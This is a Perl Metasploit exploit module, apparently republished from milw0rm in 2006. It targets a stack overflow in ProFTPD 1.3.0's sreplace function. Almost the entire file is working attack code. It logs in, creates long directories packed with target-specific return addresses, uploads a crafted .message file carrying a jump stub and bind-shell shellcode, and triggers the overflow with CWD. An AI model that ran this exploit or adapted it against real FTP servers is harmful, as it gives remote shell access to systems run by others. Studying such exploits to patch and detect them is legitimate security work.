# vd_proftpd.pm - Metasploit module for ProFTPD stack overflow
#
# Copyright (c) 2006 Evgeny Legerov
#
# Permission to use, copy, modify, and distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

use strict;

package Msf::Exploit::vd_proftpd;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = { };

my $info = 
{
	"Name"      => "[0day] ProFTPD 1.3.0 stack overflow",
    	"Version"   => "\$Revision: 1.1 \$",
    	"Authors"   => ["Evgeny Legerov"],
    	"Arch"      => ["x86"],
    	"OS"        => ["linux"],
    	"Priv"      => 1,
    	"UserOpts"  =>
                {
                	"RHOST" => [1, "ADDR", "The target address"],
                    	"RPORT" => [1, "PORT", "The target port", 21],
     			"USER"  => [1, "DATA", "Username", "ftp"],
                	"PASS"  => [1, "DATA", "Password", "ftp123"],
                	"DIR"   => [0, "DATA", "Writeable directory", ""],
                },

    	"Description" => Pex::Text::Freeform(q{
This is a proof of concept exploit for src/support.c:sreplace stack overflow.

The off-by-one heap overflow bug in proftpd's sreplace function has been discovered about
2 (two) years ago by Evgeny Legerov. We tried to exploit this off-by-one bug via MKD command, but failed.
We did not work on this bug since then.

Actually, there are exists at least two bugs in sreplace function,
one is the mentioned off-by-one heap overflow bug the other is stack overflow 
via 'sstrncpy(dst,src,negative argument)'.

We were unable to reach the sreplace stack overflow bug on ProFTPD 1.2.10 stable version,
but the version 1.3.0rc3 introduced some interesting changes, among them:
1. another (integer) overflow in sreplace!
2. now it is possible to reach sreplace stack overflow via pr_display_file!
3. stupid '.message' file display bug

So we decided to choose ProFTPD 1.3.0 as a target for our exploit.
To reach the bug, you need to upload a specially created .message file to a writeable directory,
then do "CWD <writeable directory>" to trigger the invocation of sreplace function.

Note that ProFTPD 1.3.0rc3 has introduced a stupid bug: to display '.message' file
you also have to upload a file named '250'. ProFTPD 1.3.0 fixes this bug.

The exploit is a part of VulnDisco Pack since Dec 2005.
		}),


   	"Payload" =>
        	{
                "Space"     => 900,
                "Keys"      => ["+bind"],
		"BadChars" => "\%\r\n\x00"
          	},

        "DefaultTarget"  => 0,
        "Targets"        =>
         	[
        		["ProFTPD 1.3.0 (source install) / Debian 3.1",
                        	# objdump -D proftpd|grep call|grep edx
                                0x804afc8,
                                # nm proftpd|grep permanent_pool
                                0x80b59f8
			]

         	],

        "Keys"           => ["vd_proftpd"],
};

sub new	{
	my $class = shift;
	return $class->SUPER::new({"Info" => $info, "Advanced" => $advanced}, @_);
}

sub Exploit {
	my $self = shift;
        my $host = $self->GetVar("RHOST");
        my $port = $self->GetVar("RPORT");
	my $writedir = $self->GetVar("DIR");
	my $bind_port = $self->GetVar("LPORT");
	my $target = $self->Targets->[$self->GetVar("TARGET")];
	my $encodedPayload = $self->GetVar("EncodedPayload");
        my $shellcode   = $encodedPayload->Payload;

      	my $sock = Msf::Socket::Tcp->new("PeerAddr" => $host, "PeerPort"  => $port);
        if ($sock->IsError) {
                $self->PrintLine("Error creating socket: " . $sock->GetError);
                return;
        }

	my $res = $sock->Recv(-1, 20);
        if (!$res) {
                $self->PrintLine("The service did not return a valid banner");
                return;
        }
    
	$self->PrintLine("Banner: ". $self->CleanData($res));

        $sock->Send("USER ". $self->GetVar('USER') ."\r\n");
        $res = $sock->Recv(-1, 20);
        $self->PrintLine("USER response: ". $self->CleanData($res));
        if ($res !~ /^331/) {
                $sock->Close;
                return;
        }

        $sock->Send("PASS ". $self->GetVar('PASS') ."\r\n");
        $res = $sock->Recv(-1, 20);
        $self->PrintLine("PASS response: ". $self->CleanData($res));
        if ($res !~ /^230/) {
                $sock->Close;
                return;
        }
	if (length($writedir) > 0) {
		$sock->Send("CWD $writedir\r\n");
		$res = $sock->Recv(-1, 20);
		$self->PrintLine("CWD response: " . $self->CleanData($res));
	}

	my $current_dir = "";
	$sock->Send("PWD\r\n");
	$res = $sock->Recv(-1, 20);
	$current_dir = $1 if ($res =~ /257\s\"(.+)\"/);
	$current_dir .= "/" if (substr($current_dir, -1, 1) ne "/");
 	$self->PrintLine("Current directory: $current_dir");

	my $dir1 = "A" x (251 - length($current_dir));
        $self->PrintLine(sprintf "Dir1 length is %d bytes", length($dir1));

	$sock->Send("MKD $dir1\r\n");
	$res = $sock->Recv(-1, 20);
	$self->PrintLine("MKD response: " . $self->CleanData($res));

	$sock->Send("CWD $dir1\r\n");
	$res = $sock->Recv(-1,20);
	$self->PrintLine("CWD response: " . $self->CleanData($res));

  	$sock->Send("PWD\r\n");
        $res = $sock->Recv(-1, 20);
	$self->PrintLine("PWD response: " . $self->CleanData($res));
	
	my $dir2  = "B" x 64;
        $dir2 .= pack("V", $target->[1]);
        $dir2 .= pack("V", $target->[2] - 4);
        $dir2 .= "\xcc" x 28;
        $self->PrintLine(sprintf "Dir2 length is %d bytes", length($dir2));

	$sock->Send("DELE " . $dir2 . "/.message\r\n");
	$sock->Recv(-1, 20);

	$sock->Send("DELE " . $dir2 . "/250\r\n");
	$sock->Recv(-1, 20);
	
	$sock->Send("RMD $dir2\r\n");
	$sock->Recv(-1, 20);

	$sock->Send("MKD $dir2\r\n");
	$res = $sock->Recv(-1, 20);
	$self->PrintLine("MKD response: " . $self->CleanData($res));

	# Upload .message file
	$sock->Send("TYPE I\r\n");
	$sock->Recv(-1, 20);

	$sock->Send("PASV\r\n");
	$res = $sock->Recv(-1, 20);
	if ($res !~ /^227/) {
		$self->PrintLine("Incorrect response to PASV command: " . $self->CleanData($res));
		return;
	}

	$self->PrintLine("PASV response: " . $self->CleanData($res));
	$res =~ /\((\d+)\,(\d+),(\d+),(\d+),(\d+),(\d+)/;
	my $datahost = "$1.$2.$3.$4";
	my $dataport = (int($5) << 8) + int($6);

	$self->PrintLine("Opening connection to $datahost:$dataport");	
       	my $datasock = Msf::Socket::Tcp->new("PeerAddr" => $datahost, "PeerPort"  => $dataport);
        if ($datasock->IsError) {
                $self->PrintLine("Error creating socket: " . $datasock->GetError);
                return;
        }

	$sock->Send("STOR $dir2/.message\r\n");
	$res = $sock->Recv(-1, 20);
	$self->PrintLine("STOR response: " . $self->CleanData($res));


     	my $filedata = "";
        $filedata .= "A";
        $filedata .= "\x66\x81\xc2\x5e\x13\x52\xc3"; # add $0x135e, %dx; push %edx; ret
        $filedata .= "\%C" x 11;
        $filedata .= "A";
        $filedata .= $shellcode;
	$filedata .= "A" x (900 - length($shellcode));
        $filedata .= "\%CA" x 10;

	$datasock->Send($filedata);
	$datasock->Close();

	$res = $sock->Recv(-1, 20);
	$self->PrintLine("FILE transfered: " . $self->CleanData($res));

	# Trigger sreplace overflow
	$sock->Send("CWD $dir2\r\n");
	$sock->Recv(-1,20);
	
	sleep(3);

	$sock->Close();
}


sub CleanData {
        my $self = shift;
        my $data = shift;
        $data =~ s/\r|\n//g;
        return $data;
}

__END__

# milw0rm.com [2006-11-27]